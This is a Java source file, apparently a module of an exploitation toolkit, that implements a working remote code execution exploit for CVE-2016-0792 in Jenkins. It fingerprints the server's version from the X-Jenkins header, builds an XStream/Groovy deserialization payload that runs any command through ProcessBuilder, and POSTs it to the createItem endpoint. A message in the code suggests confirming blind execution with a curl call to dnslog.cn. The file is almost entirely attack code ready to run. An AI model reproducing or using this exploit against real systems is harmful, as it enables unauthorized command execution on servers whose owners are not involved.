package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpHead;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.io.IOException;
import java.math.BigDecimal;
import java.util.Random;

public class CVE_2016_0792 implements ExploitInterface {

    private String url = "";

    @Override
    public String checkVul(String url) {
        this.url = url;
        return "[-] CVE-2016-0792 Jenkins 反序列化无回显远程代码执行,请从文件读取/命令执行模块进行判断 eg:curl dnslog.cn (command)";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        exploit(this.url, cmd);
        return "无回显命令执行,请自行验证";
    }


    @Override
    public boolean isVul() {
        return true;
    }

    public static void exploit(String url, String command) {
        System.out.println("[*] STARTING");
        try {
            System.out.println("[+] Trying to exploit Jenkins running at address: " + url);
            // Perform initial URL check to see if server is online and returns correct response code using HEAD request
            CloseableHttpClient httpClient = HttpClients.createDefault();
            HttpHead httpHead = new HttpHead(url);
            CloseableHttpResponse headResponse = httpClient.execute(httpHead);
            if (headResponse.getStatusLine().getStatusCode() == 200) {
                System.out.println("[+] Server online and responding | RESPONSE: " + headResponse.getStatusLine().getStatusCode());
                // Check if X-Jenkins header containing version is present then proceed
                String jenkinsVersionHeader = headResponse.getFirstHeader("X-Jenkins").getValue();
                if (jenkinsVersionHeader != null) {
                    // Strip version after second dot from header to perform conversion to BigDecimal
                    String strippedVersion = jenkinsVersionHeader.split("\\.")[0] + "." + jenkinsVersionHeader.split("\\.")[1];
                    // Perform basic version check
                    if (new BigDecimal(strippedVersion).compareTo(new BigDecimal("1.650")) < 0) {
                        System.out.println("[+] Jenkins version: " + strippedVersion + " | VULNERABLE");
                        // Prepare payload
                        String payload = preparePayload(command);
                        // Prepare POST url
                        String randomJobName = generateRandomJobName();
                        String postUrl = url.endsWith("/") ? url + "createItem?name=" + randomJobName : url + "/createItem?name=" + randomJobName;
                        System.out.println("[+] Will POST to " + postUrl);
                        // Try to execute passed command
                        HttpPost httpPost = new HttpPost(postUrl);
                        httpPost.setHeader("Content-Type", "application/xml");
                        httpPost.setEntity(new StringEntity(payload));
                        CloseableHttpResponse postResponse = httpClient.execute(httpPost);
                        System.out.println("[+] Exploit launched ");
                        // 500 response code is ok here
                        System.out.println("[+] Response code: " + postResponse.getStatusLine().getStatusCode());
                        if (postResponse.getStatusLine().getStatusCode() == 500) {
                            System.out.println("[+] SUCCESS");
                        } else {
                            System.out.println("[-][ERROR] EXPLOIT LAUNCHED, BUT WRONG RESPONSE CODE RETURNED");
                        }
                    } else {
                        System.out.println("[-][ERROR] Version " + strippedVersion + " is not vulnerable");
                    }
                } else {
                    System.out.println("[-][ERROR] X-Jenkins header not present, check if Jenkins is actually running at " + url);
                }
            } else {
                System.out.println("[-][ERROR] " + url + " Server did not return success response code | RESPONSE: " + headResponse.getStatusLine().getStatusCode());
            }
            httpClient.close();
        } catch (IOException ex) {
            System.out.println("[-] [ERROR] Request exception: " + ex.getMessage());
        }
        System.out.println("[*] FINISHED");
    }

    public static String preparePayload(String command) {
        String[] splitCommand = command.split(" ");
        StringBuilder preparedCommands = new StringBuilder();
        for (String entry : splitCommand) {
            preparedCommands.append("<string>").append(entry).append("</string>");
        }
        String xml = "<map>\n" +
                "  <entry>\n" +
                "    <groovy.util.Expando>\n" +
                "      <expandoProperties>\n" +
                "        <entry>\n" +
                "          <string>hashCode</string>\n" +
                "          <org.codehaus.groovy.runtime.MethodClosure>\n" +
                "            <delegate class=\"groovy.util.Expando\"/>\n" +
                "            <owner class=\"java.lang.ProcessBuilder\">\n" +
                "              <command>" + preparedCommands + "</command>\n" +
                "            </owner>\n" +
                "            <method>start</method>\n" +
                "          </org.codehaus.groovy.runtime.MethodClosure>\n" +
                "        </entry>\n" +
                "      </expandoProperties>\n" +
                "    </groovy.util.Expando>\n" +
                "    <int>1</int>\n" +
                "  </entry>\n" +
                "</map>";
        return xml;
    }

    public static String generateRandomJobName() {
        String characters = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < 8; i++) {
            int index = random.nextInt(characters.length());
            sb.append(characters.charAt(index));
        }
        return sb.toString();
    }
}
